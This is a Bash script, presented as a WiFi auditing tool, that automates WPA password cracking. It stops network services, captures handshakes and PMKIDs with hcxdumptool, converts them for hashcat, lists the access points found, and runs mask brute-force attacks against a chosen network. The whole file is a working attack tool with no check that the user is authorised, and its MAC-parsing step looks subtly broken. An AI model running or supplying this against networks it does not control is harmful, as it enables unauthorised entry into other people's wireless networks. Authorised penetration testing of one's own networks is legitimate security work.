#!/bin/bash
# =====================================================================
# WiFi Auditing Automation Tool - v2.0 (Bash Edition)
# Estética mejorada + prompt personalizado
# =====================================================================

# ---------------------------
# Colores
# ---------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ---------------------------
# Funciones de impresión
# ---------------------------
print_info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

# ---------------------------
# Verificaciones
# ---------------------------
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "Este script debe ejecutarse como root (sudo)"
        exit 1
    fi
}

check_dependencies() {
    local deps=(hcxdumptool hcxpcapngtool hashcat)
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        print_error "Faltan dependencias: ${missing[*]}"
        print_info "Instálalas con: sudo apt install ${missing[*]}"
        exit 1
    fi
}

# ---------------------------
# Banner de ayuda estético
# ---------------------------
show_banner() {
    clear
    echo ""
    if command -v figlet >/dev/null 2>&1; then
        echo -e "${CYAN}"
        figlet -f slant "WiFi Audit Tool"
        echo -e "${NC}"
    else
        echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║${WHITE}      WiFi Auditing Automation Tool v2.0${CYAN}     ║${NC}"
        echo -e "${CYAN}║${WHITE}       IEEE 802.11 Security Analysis${CYAN}         ║${NC}"
        echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
    fi
}

# ---------------------------
# Comando: help
# ---------------------------
show_help() {
    echo -e "${WHITE}"
    echo "──────────────────────────────────────────────"
    echo "   USO DE COMANDOS DISPONIBLES"
    echo "──────────────────────────────────────────────"
    echo ""
    echo -e "${YELLOW}analyze${NC} ${WHITE}<interfaz> <archivo.pcapng>${NC}"
    echo "  Captura tráfico WiFi, extrae EAPOL y genera hashcat file."
    echo "  Ejemplo: analyze wlan0 captura.pcapng"
    echo ""
    echo -e "${YELLOW}lsmac${NC}"
    echo "  Lista las MACs y SSIDs descubiertos."
    echo ""
    echo -e "${YELLOW}attack${NC} ${WHITE}<mac> <máscara>${NC}"
    echo "  Ejecuta hashcat con la máscara especificada."
    echo "  Ejemplo: attack 00:11:22:33:44:55 ?d?d?d?d?d?d?d?d"
    echo ""
    echo -e "${YELLOW}help${NC}"
    echo "  Muestra este menú de ayuda."
    echo ""
    echo -e "${YELLOW}exit${NC}"
    echo "  Sale del programa."
    echo ""
    echo -e "${CYAN}──────────────────────────────────────────────${NC}"
}

# ---------------------------
# Función analyze
# ---------------------------
analyze() {
    local iface="$1"
    local outfile="$2"

    if [[ -z "$iface" || -z "$outfile" ]]; then
        print_error "Uso: analyze <interfaz> <archivo.pcapng>"
        return 1
    fi
    if ! ip link show "$iface" &>/dev/null; then
        print_error "Interfaz no encontrada: $iface"
        return 1
    fi

    print_info "Iniciando captura con hcxdumptool en $iface..."
    print_warning "Presiona Ctrl+C para detener."

    systemctl stop NetworkManager wpa_supplicant 2>/dev/null
    hcxdumptool -i "$iface" -w "$outfile" -F --rds=1
    systemctl start NetworkManager wpa_supplicant 2>/dev/null

    if [[ ! -f "$outfile" ]]; then
        print_error "No se generó el archivo $outfile."
        return 1
    fi

    print_info "Convirtiendo a formato hashcat..."
    hcxpcapngtool -o "${outfile%.pcapng}.hc22000" "$outfile"
    print_success "Archivo convertido: ${outfile%.pcapng}.hc22000"
}

# ---------------------------
# Función lsmac
# ---------------------------
lsmac() {
    local hash_file=$(ls -t *.hc22000 2>/dev/null | head -n1)

    if [[ -z "$hash_file" ]]; then
        print_error "No se encontró ningún archivo .hc22000."
        return 1
    fi

    print_info "Extrayendo direcciones MAC del archivo: $hash_file"
    echo ""

    # Extraer el 4º campo (MAC AP) separado por "*"
    declare -A seen
    local mac_list=()

    while IFS='*' read -r prefix stype mac rest; do
        # mac es el cuarto valor (campo 4)
        [[ -z "$rest" ]] && continue
        mac_field=$(echo "$rest" | cut -d'*' -f1)

        # Asegurar formato con ':' y poner mayúsculas
        formatted_mac=$(echo "$mac_field" | sed 's/\\(..\\)/\\1:/g' | sed 's/:$//' | tr '[:lower:]' '[:upper:]')

        # Evitar duplicados
        if [[ -n "$formatted_mac" && -z "${seen[$formatted_mac]}" ]]; then
            seen[$formatted_mac]=1
            mac_list+=("$formatted_mac")
        fi
    done < "$hash_file"

    # Cabecera de tabla
    printf "%-20s %-30s\n" "MAC ADDRESS" "VENDOR"
    printf "%-20s %-30s\n" "--------------------" "------------------------------"

    # Recorrer MACs y opcionalmente consultar fabricante
    for mac in "${mac_list[@]}"; do
        # Consultar vendor en macvendors.com (si hay conexión)
        if curl -s --max-time 2 "https://api.macvendors.com/$mac" -o /tmp/vendor_response.txt; then
            vendor=$(cat /tmp/vendor_response.txt)
            [[ -z "$vendor" ]] && vendor="Desconocido"
        else
            vendor="Sin conexión"
        fi

        printf "%-20s %-30s\n" "$mac" "$vendor"
    done
    echo ""
    print_success "Total de MACs encontradas: ${#mac_list[@]}"
}


# ---------------------------
# Función attack
# ---------------------------
attack() {
    local mac="$1"
    local mask="$2"
    local hashfile=$(ls -t *.hc22000 2>/dev/null | head -n1)

    if [[ -z "$mac" || -z "$mask" ]]; then
        print_error "Uso: attack <mac> <máscara>"
        return 1
    fi
    [[ -z "$hashfile" ]] && print_error "No hay archivo hc22000 disponible." && return 1

    print_info "Seleccionando hash correspondiente a $mac..."
    grep -i "${mac//:/}" "$hashfile" > "hash_${mac//:/}.hc22000"
    hashcat -m 22000 "hash_${mac//:/}.hc22000" -a 3 "$mask"
}

# ---------------------------
# Interfaz interactiva
# ---------------------------
main() {
    check_root
    check_dependencies
    show_banner
    show_help

    local PROMPT_COLOR="${CYAN}"
    local PROMPT_NAME="<wifi_audit_tool>"
    local PROMPT_RESET="${NC}"

    while true; do
        echo ""
        read -e -p "$(echo -e "${PROMPT_COLOR}${PROMPT_NAME}${PROMPT_RESET} ▶ ${WHITE}")" -a cmd
        case "${cmd[0]}" in
            analyze) analyze "${cmd[1]}" "${cmd[2]}";;
            lsmac) lsmac;;
            attack) attack "${cmd[1]}" "${cmd[2]}";;
            help) show_help;;
            exit|quit) print_info "Saliendo..."; break;;
            *) print_error "Comando no reconocido: ${cmd[0]}";;
        esac
    done
}

main
